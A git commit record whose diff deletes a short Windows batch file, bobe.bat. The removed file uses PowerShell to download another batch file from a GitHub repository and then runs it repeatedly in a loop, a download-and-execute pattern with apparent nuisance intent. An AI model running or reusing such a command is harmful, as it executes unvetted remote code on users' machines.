3186d03eb4b90250f21b337586b42dfc636bfab0
LKR-beta <gbu23224@gmail.com>
2024-07-04 21:54:14 +0900

    Deleted

--- bobe.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-cls
-
-powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/LKR.bat','C:\your\asylum\LKR.bat')"
-
-FOR /L %%i in (0, 10, 150) do LKR.bat
-
-exit
